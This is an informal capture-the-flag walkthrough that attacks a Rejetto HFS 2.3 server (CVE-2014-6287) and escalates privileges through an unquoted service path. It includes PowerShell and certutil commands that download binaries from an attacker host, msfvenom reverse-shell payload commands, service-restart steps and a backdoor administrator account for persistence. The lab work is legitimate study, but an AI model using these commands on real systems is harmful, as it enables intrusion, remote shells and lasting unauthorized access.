Once you open the IP website, you will find Bill Harper's pic as "employee of the month"
Next we find the port 8080 runs rejetto 2.3 web file server (WFS)
Quick research gives us an exploitDB exploit for CVE 2014-6287
It needs nc.exe to be served on port 80 of our machine
So copy it from `/usr/share/windows-binaries` to wherever we want it, serve it with `python -m httpServer 80`, download the exploit, modify the local ip and port.
Exploit - sends a nullbyte search request, and builds GET command from there to GET the nc,.exe we're hosting, and the next time we run it, executes it and runs nc the next time.

Now, we get bill user's shell
For privesc, we serve winpeas through the same python server 80.

kali has peass package, which has both wnipeas and linpeas
apt install peass
`/usr/share/peass/winpeas/` -- has all kinds of req binaries for the windows

```powershell
powershell.exe -exec bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://10.17.34.38/winPEASx64.exe','C:\Users\bill\Desktop\winPEAS2.exe')
powershell.exe -exec bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://10.17.34.38/accesschk64.exe','C:\Users\bill\Desktop\accesschk.exe')
```
But this will kil the rev-shel. for it to not kill, enclose the powershell command in a "Start-Process" command, that will background the download process.

```powershell
powershell.exe -exec bypass -Command "Start-Process powershell -ArgumentList '-exec bypass -Command (New-Object System.Net.WebClient).DownloadFile(''http://10.17.34.38/winPEAS.exe'',''C:\Users\bill\Desktop\winPEAS.exe'')'"
and
powershell.exe -exec bypass -Command "Start-Process powershell -ArgumentList '-exec bypass -Command (New-Object System.Net.WebClient).DownloadFile(''http://10.17.34.38/accesschk64.exe'',''C:\Users\bill\Desktop\accesschk.exe'')'"

powershell.exe -exec bypass -Command "Start-Process powershell -ArgumentList '-exec bypass -Command (New-Object System.Net.WebClient).DownloadFile(''http://10.17.34.38/rev-svc.exe'',''C:\Program Files (x86)\IObit\Advanced.exe'')'"
```
Also what works without breaking is below one. BUT USE ABOVE ONES!!!
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.17.34.38/winPEASx64.exe','C:\Users\bill\Desktop\winPEAS.exe')"
```
Alternatively,
```powershell
certutil -urlcache -f http://10.17.34.38/winPEAS.exe winPEAS.exe
```
`winPEAS.exe quiet log`
We discover, that there is an unquoted service path vulnerability, which we exploit.
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe is unquoted.

First we check if it's start user name has better privileges than bill
`sc qc AdvancedSystemCareService9` - seems line local system. So, yep!

Verifying on accesschk.exe, we find we can start/stop this service
once we find unquoted service,
`accesschk.exe /accepteula -ucqv AdvancedSystemCareService9`
-ucqv for specific user group, check access right, quiet, verbose
From his, we notice Bill has service start and stop perms
`accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\IObit\"`
-uwdq checks for specific user group, write, delete, quiet
from this, we learn if we can write in that area or not.


So, we make a rev shell using msfvenom, and call it Advanced.exe

```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT=443 -f exe-service -o rev-svc.exe`
OR
`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.34.38 LPORT=443 -e x86/shikata_ga_nai -f exe -o Advanced.exe`
`chmod +x rev-svc.exe`
```

```powershell 
powershell.exe -exec bypass -Command "Start-Process powershell -ArgumentList '-exec bypass -Command (New-Object System.Net.WebClient).DownloadFile(''http://10.17.34.38/rev-svc.exe'',''C:\Program Files (x86)\IObit\Advanced.exe'')'"`
```

start listening on the new port 443, 
`sc stop AdvancedSystemCareService9`
`sc start AdvancedSystemCareService9`

for newer powershell versions (5 and above or 4 and above)
`powershell.exe -c "$PSVersionTable.PSVersion"`  -->to check version
powershell -c “Invoke-WebRequest -OutFile winPEAS.exe http://10.17.34.38/winPEAS.exe”


```powershell
commands stiill break now and then. gotta experiment and better them
winPEAS.exe > outfile 2>$null   or 4>null (find out which wont crash)
powershell.exe -exec bypass -Command "Start-Process 'C:\path\to\winPEAS.exe'"
```

### Tip --  ==To Add Persistence==
Once you get admin privileges, add our new user
```powershell
net user ajhash Password123 /add
net localgroup "administrators" ajhash /add
```
